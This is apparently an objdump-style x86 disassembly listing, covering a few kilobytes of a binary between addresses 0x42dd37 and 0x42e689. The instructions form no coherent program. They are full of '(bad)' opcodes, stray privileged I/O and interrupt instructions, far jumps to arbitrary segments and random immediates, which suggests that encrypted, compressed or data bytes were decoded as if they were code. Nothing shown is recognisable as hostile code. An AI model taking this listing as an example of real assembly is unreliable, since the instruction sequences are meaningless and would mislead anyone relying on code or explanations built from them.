  42dd37:	fsubr  DWORD PTR [esi+0x3b]
  42dd3a:	sub    eax,0x619fbf0f
  42dd3f:	hlt    
  42dd40:	push   eax
  42dd41:	inc    edi
  42dd42:	xchg   BYTE PTR [edi+0x151aec9a],ah
  42dd48:	cmp    dh,BYTE PTR [ebp-0x71]
  42dd4b:	pop    ebp
  42dd4c:	sub    BYTE PTR [esi+esi*4+0x55df1901],dh
  42dd53:	stc    
  42dd54:	pop    edx
  42dd55:	pop    ecx
  42dd56:	inc    ecx
  42dd57:	ret    0x84f8
  42dd5a:	lds    edi,FWORD PTR [ebp+0x74b960d1]
  42dd60:	cmp    cl,BYTE PTR ds:0x7f14c77d
  42dd66:	cmc    
  42dd67:	xchg   ebp,eax
  42dd68:	stc    
  42dd69:	xchg   ebp,eax
  42dd6a:	out    dx,al
  42dd6b:	xchg   ecx,eax
  42dd6c:	(bad)
  42dd6f:	mov    esi,0x4f7cc37a
  42dd74:	sahf   
  42dd75:	xlat   BYTE PTR ds:[ebx]
  42dd76:	cmp    eax,0x76199f56
  42dd7b:	jmp    0x7bc63519
  42dd80:	xor    BYTE PTR [eax-0x4a],0x2e
  42dd84:	pop    ax
  42dd86:	sub    eax,0x3ac46c42
  42dd8b:	dec    ecx
  42dd8c:	retf   0xaa4d
  42dd8f:	or     BYTE PTR [eax],al
  42dd91:	gs jle 0x42ddfb
  42dd94:	pop    edi
  42dd95:	lods   al,BYTE PTR ds:[esi]
  42dd96:	or     eax,0x607a8885
  42dd9b:	or     eax,0x5627fed7
  42dda0:	xchg   BYTE PTR [eax-0x6f],ah
  42dda3:	sbb    al,0x46
  42dda5:	cmc    
  42dda6:	outs   dx,DWORD PTR ds:[esi]
  42dda7:	nop
  42dda8:	out    dx,eax
  42dda9:	and    esp,ebp
  42ddab:	mov    al,0x8e
  42ddad:	shl    ah,1
  42ddaf:	xchg   esp,eax
  42ddb0:	xlat   BYTE PTR ds:[ebx]
  42ddb1:	out    0x98,eax
  42ddb3:	xor    ebp,esp
  42ddb5:	and    eax,DWORD PTR [ebp+0x33]
  42ddb8:	xchg   BYTE PTR [ecx+0x6dd311f],dl
  42ddbe:	ficom  WORD PTR [ebp+0x4a38d21f]
  42ddc4:	(bad)
  42ddc8:	add    eax,0xa8dc8991
  42ddcd:	adc    eax,0x73d612d5
  42ddd2:	out    dx,eax
  42ddd3:	or     dl,bh
  42ddd5:	jmp    0x6c0ba481
  42ddda:	cwde   
  42dddb:	ret    
  42dddc:	lahf   
  42dddd:	cmp    ch,BYTE PTR [eax-0x4a]
  42dde0:	ret    
  42dde1:	cld    
  42dde2:	mov    ds:0xff1b0177,al
  42dde7:	iret   
  42dde8:	cmp    al,0xe3
  42ddea:	nop
  42ddeb:	aam    0xfe
  42dded:	outs   dx,BYTE PTR ds:[esi]
  42ddee:	(bad)  
  42ddef:	adc    BYTE PTR cs:[edx],0x52
  42ddf3:	xor    eax,0xbd35738a
  42ddf8:	sub    ebp,DWORD PTR [esi]
  42ddfa:	jnp    0x42de1e
  42ddfc:	and    bh,ah
  42ddfe:	mov    bh,0x24
  42de00:	add    al,0xde
  42de02:	aas    
  42de03:	dec    ebx
  42de04:	xor    cl,ah
  42de06:	pop    edi
  42de07:	xchg   ecx,eax
  42de08:	adc    edx,DWORD PTR [edi+eiz*4-0x40566cfd]
  42de0f:	mov    edi,0x0
	...
  42de74:	out    0x82,al
  42de76:	lods   eax,DWORD PTR ds:[esi]
  42de77:	xor    ebp,ebp
  42de79:	aas    
  42de7a:	(bad)  
  42de7b:	xlat   BYTE PTR ds:[ebx]
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	inc    eax
  42de81:	xchg   esi,eax
  42de82:	pushf  
  42de83:	mov    DWORD PTR [eax],esi
  42de85:	jmp    0x42de88
  42de87:	add    BYTE PTR [ecx+eax*1],al
  42de8a:	add    BYTE PTR [eax],al
  42de8c:	mov    ds:0xbace76f,al
  42de91:	in     eax,0x43
  42de93:	or     BYTE PTR [ebp-0x7fee44c2],cl
  42de99:	jp     0x42deba
  42de9b:	js     0x42df01
  42de9d:	xrelease xchg DWORD PTR [ecx],ecx
  42dea0:	or     BYTE PTR [edi],dl
  42dea2:	mov    ch,0x80
  42dea4:	and    al,0x55
  42dea6:	sbb    DWORD PTR [ebx+0x123680a3],esi
  42deac:	std    
  42dead:	fsub   st(0),st
  42deaf:	pop    esp
  42deb0:	arpl   WORD PTR [ecx+0x6891a002],ax
  42deb6:	jnp    0x42de7c
  42deb8:	pop    es
  42deb9:	ret    
  42deba:	rcr    eax,1
  42debc:	imul   edi,DWORD PTR [esi+0x7c],0x6d078f89
  42dec3:	mov    ds:0x312badf5,eax
  42dec8:	cmp    esi,DWORD PTR [ebp+0x8025bd8]
  42dece:	hlt    
  42decf:	shl    DWORD PTR [edx],0x90
  42ded2:	pop    ebp
  42ded3:	js     0x42de7b
  42ded5:	fs stc 
  42ded7:	ja     0x42df53
  42ded9:	ja     0x42df50
  42dedb:	frstor [edi+edx*1+0x10072685]
  42dee2:	mov    WORD PTR [ebp+0x78],cs
  42dee5:	xchg   ebx,eax
  42dee6:	sbb    DWORD PTR [ebp-0x26],esp
  42dee9:	jae    0x42deed
  42deeb:	jb     0x42dea8
  42deed:	test   BYTE PTR ds:[esi+ebx*8],bh
  42def1:	fisub  DWORD PTR [esp+eiz*4+0x18]
  42def5:	aam    0x43
  42def7:	test   cl,bl
  42def9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42defa:	fnstcw WORD PTR [edi-0x460dea84]
  42df00:	inc    edi
  42df01:	mov    eax,ds:0x61c66c4c
  42df06:	inc    esi
  42df07:	xlat   BYTE PTR ds:[ebx]
  42df08:	sbb    ebx,DWORD PTR [esi-0x5799c13d]
  42df0e:	mov    bh,bl
  42df10:	(bad)  
  42df11:	dec    ecx
  42df12:	stos   BYTE PTR es:[edi],al
  42df13:	ins    BYTE PTR es:[edi],dx
  42df14:	pop    ebx
  42df15:	push   cs
  42df16:	iret   
  42df17:	xchg   esi,eax
  42df18:	push   esp
  42df19:	mov    eax,ds:0xae5ed7eb
  42df1e:	sbb    al,0xf3
  42df20:	(bad)  
  42df21:	aas    
  42df22:	xlat   BYTE PTR ds:[ebx]
  42df23:	pop    ebp
  42df24:	popa   
  42df25:	push   eax
  42df26:	jns    0x42df74
  42df28:	pop    esi
  42df29:	pop    edx
  42df2a:	fs popa 
  42df2c:	pushf  
  42df2d:	xchg   edi,edi
  42df2f:	scas   eax,DWORD PTR es:[edi]
  42df30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42df31:	inc    ebp
  42df32:	dec    edi
  42df33:	mov    dh,bh
  42df35:	adc    al,0xd6
  42df37:	push   ecx
  42df38:	cmp    bh,BYTE PTR [ebp-0x13]
  42df3b:	sti    
  42df3c:	cli    
  42df3d:	jmp    0x42df7d
  42df3f:	ss mov bl,0x60
  42df42:	ret    0x6acc
  42df45:	jmp    0x11ed7759
  42df4a:	outs   dx,BYTE PTR ds:[esi]
  42df4b:	stc    
  42df4c:	xchg   edi,eax
  42df4d:	xchg   BYTE PTR [edi-0x2e],dl
  42df50:	in     eax,dx
  42df51:	stos   DWORD PTR es:[edi],eax
  42df52:	pop    ecx
  42df53:	xchg   esp,eax
  42df54:	jle    0x42df14
  42df56:	mov    ds:0xc09a3869,al
  42df5b:	adc    al,0xce
  42df5d:	xchg   ebp,eax
  42df5e:	cs js  0x42dfda
  42df61:	stos   DWORD PTR es:[edi],eax
  42df62:	pop    ebx
  42df63:	lods   eax,DWORD PTR ds:[esi]
  42df64:	push   ebx
  42df65:	cmp    al,0x3f
  42df67:	stos   DWORD PTR es:[edi],eax
  42df68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42df69:	stos   DWORD PTR es:[edi],eax
  42df6a:	pop    DWORD PTR [edx+0x3]
  42df6d:	add    dh,0x61
  42df70:	dec    esi
  42df71:	xchg   edx,eax
  42df72:	(bad)  
  42df73:	fdiv   DWORD PTR [esi+0x30a93116]
  42df79:	iret   
  42df7a:	lds    ecx,FWORD PTR [edx]
  42df7c:	int    0xf1
  42df7e:	add    esp,ecx
  42df80:	pop    es
  42df81:	mov    al,BYTE PTR [ebx+0xe]
  42df84:	push   ebp
  42df85:	retf   
  42df86:	in     al,dx
  42df87:	push   cs
  42df88:	out    dx,al
  42df89:	aam    0x46
  42df8b:	retf   
  42df8c:	mov    eax,0x8c9241
	...
  42dff1:	add    BYTE PTR [eax],al
  42dff3:	add    BYTE PTR [edx],al
  42dff5:	(bad)  
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi+0x75]
  42e001:	jecxz  0x42dffc
  42e003:	add    BYTE PTR [esp+ebp*8],dh
  42e006:	add    DWORD PTR [eax],eax
  42e008:	add    al,0x1
  42e00a:	add    BYTE PTR [eax],al
  42e00c:	sbb    esp,DWORD PTR ds:0xfdf53150
  42e012:	jbe    0x42df9e
  42e014:	cli    
  42e015:	mov    al,BYTE PTR [eax]
  42e017:	mov    edx,0xf833a93d
  42e01c:	fwait
  42e01d:	icebp  
  42e01e:	xchg   DWORD PTR [eax+0x274a1af3],edx
  42e024:	push   esp
  42e025:	sbb    al,0x45
  42e027:	(bad)  
  42e028:	retf   
  42e029:	(bad)  
  42e02a:	push   ss
  42e02b:	sti    
  42e02c:	mov    dl,0x26
  42e02e:	cmp    eax,0x2b311be
  42e033:	jne    0x42dfe7
  42e035:	rcr    bl,1
  42e037:	lods   al,BYTE PTR ds:[esi]
  42e038:	sbb    ah,BYTE PTR [eax]
  42e03a:	cli    
  42e03b:	test   esp,eax
  42e03d:	inc    ecx
  42e03e:	push   esi
  42e03f:	xchg   esp,eax
  42e040:	aas    
  42e041:	ret    
  42e042:	push   ebx
  42e043:	pop    es
  42e044:	dec    edx
  42e045:	xor    eax,0x1f1a2fd7
  42e04a:	daa    
  42e04b:	xchg   ecx,eax
  42e04c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e04d:	xor    eax,0xc15d0b
  42e052:	lods   eax,DWORD PTR ds:[esi]
  42e053:	iret   
  42e054:	and    BYTE PTR [edx*8-0x4043a7],cl
  42e05b:	or     DWORD PTR ds:0xc32143de,0xce2d485b
  42e065:	inc    ebx
  42e066:	cli    
  42e067:	pop    esi
  42e068:	xchg   edi,eax
  42e069:	int    0x17
  42e06b:	mov    ecx,0x40cc754e
  42e070:	stos   DWORD PTR es:[edi],eax
  42e071:	cmp    eax,0xbb3b9374
  42e076:	push   esp
  42e077:	dec    eax
  42e078:	cwde   
  42e079:	dec    edi
  42e07a:	aas    
  42e07b:	pop    eax
  42e07c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e07d:	leave  
  42e07e:	fst    DWORD PTR [eax-0x5c0aae95]
  42e084:	mov    edx,0xbdd33880
  42e089:	mov    bl,0x50
  42e08b:	leave  
  42e08c:	mov    fs,WORD PTR [edi]
  42e08e:	pop    esp
  42e08f:	inc    ebp
  42e090:	dec    edx
  42e091:	jmp    0x573a14ed
  42e096:	fwait
  42e097:	jnp    0x42e05f
  42e099:	out    dx,al
  42e09a:	cli    
  42e09b:	jae    0x42e08f
  42e09d:	mov    dh,0x97
  42e09f:	jg     0x42e070
  42e0a1:	push   ecx
  42e0a2:	cmp    ch,dh
  42e0a4:	pop    ds
  42e0a5:	jnp    0x42e04f
  42e0a7:	jmp    0x1efb:0xf7ba2e28
  42e0ae:	rol    DWORD PTR [eax+0x366d2860],cl
  42e0b4:	adc    esi,DWORD PTR [esi+0x7b46616f]
  42e0ba:	outs   dx,DWORD PTR ds:[esi]
  42e0bb:	or     eax,0xa99f999b
  42e0c0:	add    al,0x73
  42e0c2:	inc    eax
  42e0c3:	fisubr WORD PTR [ebx-0x1a41e74]
  42e0c9:	lea    ebp,[edx]
  42e0cb:	pop    ebx
  42e0cc:	jns    0x42e0d8
  42e0ce:	mov    BYTE PTR [ebp-0x33],dl
  42e0d1:	dec    edx
  42e0d2:	retf   0xf95e
  42e0d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e0d6:	add    DWORD PTR [ebx+0x4b],ebx
  42e0d9:	repnz sub DWORD PTR [ecx],edx
  42e0dc:	mov    ebp,0xd368ae08
  42e0e1:	jne    0x42e110
  42e0e3:	xchg   ecx,eax
  42e0e4:	push   esi
  42e0e5:	loopne 0x42e0ae
  42e0e7:	sub    BYTE PTR [ebx],cl
  42e0e9:	mov    esp,0x37889c2d
  42e0ee:	jp     0x42e08e
  42e0f0:	jnp    0x42e154
  42e0f2:	push   ebx
  42e0f3:	ja     0x42e0d6
  42e0f5:	adc    dl,BYTE PTR [edi-0x1c]
  42e0f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e0f9:	push   edi
  42e0fa:	xlat   BYTE PTR ds:[ebx]
  42e0fb:	or     ah,bh
  42e0fd:	sbb    DWORD PTR [eax],0x80dfc270
  42e103:	pop    esi
  42e104:	mov    cl,0x55
  42e106:	(bad)
  42e109:	cdq    
  42e10a:	pop    ebp
  42e10b:	sbb    eax,0x86cc3ca6
	...
  42e174:	mov    eax,ds:0x7e061ecf
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	dec    edi
  42e181:	(bad)  
  42e182:	jle    0x42e16c
  42e184:	cmp    ch,ch
  42e186:	add    DWORD PTR [eax],eax
  42e188:	add    al,0x1
  42e18a:	add    BYTE PTR [eax],al
  42e18c:	push   edx
  42e18d:	push   cs
  42e18e:	mov    ch,0x9f
  42e190:	xchg   ecx,eax
  42e191:	bound  eax,QWORD PTR [ecx+0x47f58176]
  42e197:	bound  ebp,QWORD PTR [edi-0x15]
  42e19a:	xchg   edx,eax
  42e19b:	push   esi
  42e19c:	mov    dh,0x40
  42e19e:	pop    ds
  42e19f:	mov    dh,0xad
  42e1a1:	inc    edx
  42e1a2:	pop    es
  42e1a3:	repnz sub al,0x5e
  42e1a6:	(bad)  
  42e1a7:	pop    ebp
  42e1a8:	pop    ebp
  42e1a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e1aa:	mov    dl,0xcd
  42e1ac:	iret   
  42e1ad:	daa    
  42e1ae:	cmovno edi,DWORD PTR [ecx]
  42e1b1:	fild   DWORD PTR [edi-0x45]
  42e1b4:	sbb    al,0x32
  42e1b6:	xor    DWORD PTR [ebp+0x40d72546],ecx
  42e1bc:	or     DWORD PTR [ebp-0x6d7f60c5],edx
  42e1c2:	lea    ebp,[eax]
  42e1c4:	inc    edx
  42e1c5:	call   0xd811:0x11706163
  42e1cc:	mov    esi,0xf021a7b1
  42e1d1:	push   cs
  42e1d2:	jbe    0x42e1ca
  42e1d4:	cmp    DWORD PTR [edx+edi*8+0x41f52230],esi
  42e1db:	dec    edx
  42e1dc:	stc    
  42e1dd:	or     DWORD PTR [edi-0x6b],0xffffff8e
  42e1e1:	fisub  DWORD PTR [ecx-0x76b13fec]
  42e1e7:	aas    
  42e1e8:	outs   dx,DWORD PTR ds:[esi]
  42e1e9:	hlt    
  42e1ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e1eb:	or     al,ch
  42e1ed:	or     al,0xca
  42e1ef:	pusha  
  42e1f0:	iret   
  42e1f1:	lds    ebx,FWORD PTR [edi+0x3f4d14e1]
  42e1f7:	lods   al,BYTE PTR ds:[esi]
  42e1f8:	push   esi
  42e1f9:	fst    QWORD PTR [esi]
  42e1fb:	mov    ch,0xc6
  42e1fd:	inc    esp
  42e1fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e1ff:	jge    0x42e240
  42e201:	hlt    
  42e202:	(bad)  
  42e203:	mov    ecx,0x9cffd01d
  42e208:	shl    DWORD PTR [eax+0x3f84d20b],1
  42e20e:	push   esi
  42e20f:	stos   DWORD PTR es:[edi],eax
  42e210:	jmp    0x10fc:0xb5ed12ac
  42e217:	dec    edx
  42e218:	mov    edx,DWORD PTR [ecx+0x22]
  42e21b:	enter  0x301d,0x5
  42e21f:	retf   0xb8f0
  42e222:	pop    es
  42e223:	mov    edx,0xd4c98f82
  42e228:	fldcw  WORD PTR [ebx-0x69]
  42e22b:	push   eax
  42e22c:	aam    0xd0
  42e22e:	cld    
  42e22f:	adc    al,0x22
  42e231:	mov    al,0x9d
  42e233:	fsubr  QWORD PTR [ecx+esi*1-0x71847155]
  42e23a:	pop    edi
  42e23b:	inc    edx
  42e23c:	or     edi,eax
  42e23e:	stos   BYTE PTR es:[edi],al
  42e23f:	sub    ebp,esp
  42e241:	out    0x24,eax
  42e243:	jns    0x42e1c8
  42e245:	mov    bh,0x88
  42e247:	xchg   edx,eax
  42e248:	ja     0x42e29a
  42e24a:	cmp    al,0x78
  42e24c:	pop    eax
  42e24d:	(bad)  
  42e24e:	and    al,0x41
  42e250:	gs mov edx,0xf8034ea7
  42e256:	push   esp
  42e257:	cdq    
  42e258:	inc    ecx
  42e259:	data16 jg 0x42e21e
  42e25c:	out    dx,eax
  42e25d:	retf   0xb7f1
  42e260:	(bad)  
  42e261:	int3   
  42e262:	sbb    al,0x3
  42e264:	loopne 0x42e1e6
  42e266:	pop    edx
  42e267:	(bad)  
  42e26a:	jo     0x42e2ab
  42e26c:	stos   BYTE PTR es:[edi],al
  42e26d:	dec    edx
  42e26e:	fwait
  42e26f:	dec    eax
  42e270:	dec    esp
  42e271:	xchg   esp,eax
  42e272:	div    esi
  42e274:	in     al,0xb3
  42e276:	aaa    
  42e277:	pop    es
  42e278:	ret    
  42e279:	jp     0x42e230
  42e27b:	inc    eax
  42e27c:	jb     0x42e2a7
  42e27e:	xchg   edi,eax
  42e27f:	xlat   BYTE PTR ds:[ebx]
  42e280:	ret    
  42e281:	xchg   esi,eax
  42e282:	push   esp
  42e283:	ss cdq 
  42e285:	dec    ecx
  42e286:	push   cs
  42e287:	mov    edx,0x99b5f962
  42e28c:	mov    dh,0xae
  42e28e:	jo     0x42e2b2
	...
  42e2f4:	lods   eax,DWORD PTR ds:[esi]
  42e2f5:	cmp    eax,0xb79aa78a
  42e2fa:	lods   eax,DWORD PTR ds:[esi]
  42e2fb:	aas    
  42e2fc:	mov    ebx,0x87199140
  42e301:	(bad)  
  42e303:	mov    ecx,0x1ee3c
  42e308:	add    al,0x1
  42e30a:	add    BYTE PTR [eax],al
  42e30c:	push   0xbe357cfd
  42e311:	iret   
  42e312:	aad    0xdd
  42e314:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e315:	pop    ebx
  42e316:	rcr    DWORD PTR [esi-0x14],1
  42e319:	push   edx
  42e31a:	push   ss
  42e31b:	scas   eax,DWORD PTR es:[edi]
  42e31c:	sbb    eax,0xf1120aef
  42e321:	xor    DWORD PTR [eax+0x193ebd68],esi
  42e327:	outs   dx,BYTE PTR ds:[esi]
  42e328:	pop    es
  42e329:	jne    0x42e398
  42e32b:	test   DWORD PTR [esi-0x2d],esi
  42e32e:	xchg   ecx,eax
  42e32f:	jl     0x42e369
  42e331:	ret    
  42e332:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e333:	sbb    BYTE PTR [esi+0x29ff765c],bl
  42e339:	push   cs
  42e33a:	not    BYTE PTR [eax+0x571d8acc]
  42e340:	mov    ebx,esp
  42e342:	add    BYTE PTR [edi+0x7d53127a],bh
  42e348:	dec    edi
  42e349:	xor    BYTE PTR [ecx],dh
  42e34b:	aam    0xef
  42e34d:	call   0x41a3:0xce1e4cb5
  42e354:	push   esi
  42e355:	mov    al,0x81
  42e357:	mov    esi,0xbdeb0444
  42e35c:	es pop eax
  42e35e:	xor    edx,DWORD PTR [ebx-0x10]
  42e361:	sbb    dh,BYTE PTR [ebx-0x3]
  42e364:	ja     0x42e300
  42e366:	fiadd  DWORD PTR [ebp+0x74]
  42e369:	add    dh,BYTE PTR [edi+0x4c]
  42e36c:	cdq    
  42e36d:	test   esi,ecx
  42e36f:	xlat   BYTE PTR ds:[ebx]
  42e370:	shr    DWORD PTR [ebx+ecx*1],cl
  42e373:	outs   dx,BYTE PTR ds:[esi]
  42e374:	sbb    DWORD PTR [edx-0xd2da9db],0xc7a843ce
  42e37e:	retf   0x9e1a
  42e381:	cli    
  42e382:	pop    eax
  42e383:	push   eax
  42e384:	pusha  
  42e385:	jb     0x42e33b
  42e387:	cmp    eax,0x3458ce59
  42e38c:	and    edx,DWORD PTR ds:0x183d20f0
  42e392:	adc    al,0x73
  42e394:	xor    eax,0xf2873289
  42e399:	and    eax,0xa6bcd535
  42e39e:	into   
  42e39f:	enter  0x6562,0x80
  42e3a3:	xor    bh,0x20
  42e3a6:	jo     0x42e373
  42e3a8:	in     eax,0x52
  42e3aa:	cld    
  42e3ab:	dec    edx
  42e3ac:	dec    ebx
  42e3ad:	add    eax,0xc4bd0b3
  42e3b2:	dec    ebx
  42e3b3:	jmp    0xbfff:0x5985d291
  42e3ba:	sub    bl,ch
  42e3bc:	adc    BYTE PTR [eax-0x2e],ch
  42e3bf:	in     eax,0xbb
  42e3c1:	pop    ebx
  42e3c2:	imul   ebp,DWORD PTR [ecx-0x11],0x1112e426
  42e3c9:	clc    
  42e3ca:	mov    ah,0x4b
  42e3cc:	leave  
  42e3cd:	mov    ds:0x12db9dc8,al
  42e3d2:	xor    eax,0xff2ab740
  42e3d7:	pushf  
  42e3d8:	sbb    ebx,esi
  42e3da:	pop    esp
  42e3db:	(bad)  
  42e3dc:	xor    ah,BYTE PTR [esp+edx*1-0x10cf2044]
  42e3e3:	aam    0x2e
  42e3e5:	inc    ecx
  42e3e6:	push   edi
  42e3e7:	js     0x42e433
  42e3e9:	pop    es
  42e3ea:	loop   0x42e3be
  42e3ec:	cld    
  42e3ed:	adc    BYTE PTR [esi+ebp*1+0x2f],dh
  42e3f1:	pop    es
  42e3f2:	test   edi,edx
  42e3f4:	mov    dl,0x44
  42e3f6:	jecxz  0x42e3dc
  42e3f8:	in     al,dx
  42e3f9:	ja     0x42e462
  42e3fb:	xor    esi,DWORD PTR [edi+edi*1+0x65]
  42e3ff:	xchg   DWORD PTR [esi-0x75],esp
  42e402:	pop    ebx
  42e403:	ja     0x42e3a8
  42e405:	lea    esi,[ecx+0x57]
  42e408:	dec    ebp
  42e409:	xchg   edx,eax
  42e40a:	sub    al,0x9b
  42e40c:	xchg   edi,eax
  42e40d:	mov    ah,0x38
  42e40f:	test   DWORD PTR [eax],eax
	...
  42e471:	add    BYTE PTR [eax],al
  42e473:	add    dl,ah
  42e475:	mov    ebp,0xe7dfc7dc
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	xchg   edi,eax
  42e481:	daa    
  42e482:	pop    ecx
  42e483:	gs inc eax
  42e485:	out    dx,eax
  42e486:	add    DWORD PTR [eax],eax
  42e488:	add    al,0x1
  42e48a:	add    BYTE PTR [eax],al
  42e48c:	push   0xc2e5f632
  42e491:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e492:	cmp    ebx,ecx
  42e494:	fild   DWORD PTR [ecx+0x401e3333]
  42e49a:	fs int 0x5b
  42e49d:	icebp  
  42e49e:	push   ds
  42e49f:	and    cl,dh
  42e4a1:	enter  0x7491,0x43
  42e4a5:	and    al,0xf
  42e4a7:	les    eax,FWORD PTR [ebp-0x4d02ce0d]
  42e4ad:	add    ecx,DWORD PTR [ebx-0x48]
  42e4b0:	xor    esp,DWORD PTR [ecx-0xf]
  42e4b3:	aam    0xce
  42e4b5:	inc    ecx
  42e4b6:	inc    ecx
  42e4b7:	fcom   DWORD PTR [edi]
  42e4b9:	sub    esp,edx
  42e4bb:	pop    ebp
  42e4bc:	or     BYTE PTR [esi],dl
  42e4be:	add    DWORD PTR [ebp+0x7a],edi
  42e4c1:	fs in  eax,dx
  42e4c3:	cmp    DWORD PTR [eax+ecx*8+0x23],edx
  42e4c7:	stc    
  42e4c8:	mov    ebp,0x899f97bb
  42e4cd:	dec    esi
  42e4ce:	push   edx
  42e4cf:	cmp    DWORD PTR [eax-0x792f8ed2],0x46
  42e4d6:	and    eax,0x96ba9488
  42e4db:	inc    edx
  42e4dc:	popa   
  42e4dd:	loope  0x42e4fc
  42e4df:	and    cl,BYTE PTR [eax+edi*1+0x77771c9e]
  42e4e6:	xor    eax,0x3d42c1ab
  42e4eb:	outs   dx,DWORD PTR ds:[esi]
  42e4ec:	cwde   
  42e4ed:	adc    al,0x1
  42e4ef:	jmp    0x42e4b6
  42e4f1:	test   eax,0x3ca902b1
  42e4f6:	mov    cl,0x62
  42e4f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e4f9:	popf   
  42e4fa:	or     ebx,DWORD PTR [ecx]
  42e4fc:	imul   esi,DWORD PTR [esi+0x12],0x3cdbe19e
  42e503:	out    0x43,al
  42e505:	push   cs
  42e506:	je     0x42e4fc
  42e508:	and    ebp,DWORD PTR [eax+0x23]
  42e50b:	pushf  
  42e50c:	(bad)  
  42e50e:	aaa    
  42e50f:	scas   eax,DWORD PTR es:[edi]
  42e510:	adc    edi,DWORD PTR [ebp-0x51]
  42e513:	retf   0x5347
  42e516:	xchg   ebp,eax
  42e517:	int    0x17
  42e519:	neg    ecx
  42e51b:	dec    ebp
  42e51c:	cmp    esi,DWORD PTR [ebx+0x58]
  42e51f:	lahf   
  42e520:	pop    ebx
  42e521:	les    ebx,FWORD PTR [eax]
  42e523:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e524:	pop    ebx
  42e525:	add    DWORD PTR [esp+ebp*1],esp
  42e528:	push   esp
  42e529:	or     DWORD PTR [edi+0x5ab6a1da],edx
  42e52f:	iret   
  42e530:	push   edx
  42e531:	add    BYTE PTR [ecx-0x1f],dl
  42e534:	pop    ebp
  42e535:	ins    BYTE PTR es:[edi],dx
  42e536:	ja     0x42e576
  42e538:	xchg   edx,eax
  42e539:	adc    BYTE PTR [ecx-0x4],ah
  42e53c:	into   
  42e53d:	push   0xfffffffa
  42e53f:	loop   0x42e4c5
  42e541:	cmp    edi,edi
  42e543:	mov    dl,0xae
  42e545:	pop    ebp
  42e547:	and    DWORD PTR [ebx+0x3b],esp
  42e54a:	pop    ds
  42e54b:	jbe    0x42e4f9
  42e54d:	lock mov ebp,0x7e7bfb1f
  42e553:	and    al,0x42
  42e555:	inc    ebp
  42e556:	pop    es
  42e557:	scas   al,BYTE PTR es:[edi]
  42e558:	scas   eax,DWORD PTR es:[edi]
  42e559:	rcr    BYTE PTR [edi],1
  42e55b:	push   edx
  42e55c:	in     al,dx
  42e55d:	rcr    BYTE PTR [edi-0x1d],cl
  42e560:	mov    edx,0x29433aa
  42e565:	sbb    al,0xf
  42e567:	inc    ecx
  42e568:	sub    ecx,esi
  42e56a:	or     al,0x65
  42e56c:	adc    eax,0xac3e6618
  42e571:	dec    ebp
  42e572:	xor    ebp,DWORD PTR [ebx+0x3e25c408]
  42e578:	xor    DWORD PTR [edx-0x2e037ee3],esp
  42e57e:	dec    ebp
  42e57f:	lods   eax,DWORD PTR ds:[esi]
  42e580:	pop    ss
  42e581:	lock push ebp
  42e583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e584:	(bad)
  42e587:	sub    BYTE PTR [ebx-0x1a505a5f],bl
  42e58d:	push   0x56
  42e58f:	pop    esp
	...
  42e5f4:	push   ebp
  42e5f5:	cmp    dh,cl
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	dec    edx
  42e601:	dec    edx
  42e602:	jmp    0x400:0x1f04465
  42e609:	add    DWORD PTR [eax],eax
  42e60b:	add    BYTE PTR [ecx],bl
  42e60d:	loop   0x42e625
  42e60f:	mul    ecx
  42e611:	mov    esp,0x1f03e024
  42e616:	test   al,0x7f
  42e618:	ror    DWORD PTR [ebp+ebp*8-0x57],1
  42e61c:	repz xchg esp,eax
  42e61e:	es pushf 
  42e620:	xor    ecx,DWORD PTR gs:[ecx+edi*1]
  42e624:	ja     0x42e5f2
  42e626:	jb     0x42e658
  42e628:	add    bl,al
  42e62a:	pop    ss
  42e62b:	in     eax,0xa6
  42e62d:	mov    ch,0xfd
  42e62f:	or     eax,0x73cbeb9c
  42e634:	outs   dx,BYTE PTR ds:[esi]
  42e635:	mov    ds:0x3233dcfa,al
  42e63a:	mov    cl,ch
  42e63c:	sbb    bl,bl
  42e63e:	inc    esi
  42e63f:	ret    0xc74a
  42e642:	pop    ss
  42e643:	cmp    ah,BYTE PTR [edi-0x3dfd844f]
  42e649:	stos   BYTE PTR es:[edi],al
  42e64a:	cmp    ah,BYTE PTR [edi+0x3805099f]
  42e650:	nop
  42e651:	mov    BYTE PTR [ebp-0x75],dh
  42e654:	pop    esp
  42e655:	aad    0x32
  42e657:	xchg   BYTE PTR [eax],cl
  42e659:	ret    0xce9e
  42e65c:	fsub   DWORD PTR [ecx-0xcf04120]
  42e662:	pop    edi
  42e663:	test   BYTE PTR [ecx-0x34b0ba15],bl
  42e669:	adc    ebp,DWORD PTR [edx+0xcb860e6]
  42e66f:	int3   
  42e670:	sub    bh,BYTE PTR ds:0x72488e2e
  42e676:	inc    esi
  42e677:	push   ecx
  42e678:	out    dx,al
  42e679:	and    al,0x41
  42e67b:	fs push ebp
  42e67d:	sub    ch,bh
  42e67f:	inc    DWORD PTR [esi+0x2c15d68f]
  42e685:	popf   
  42e686:	jnp    0x42e6d8
  42e688:	aaa    
  42e689:	dec    ebp
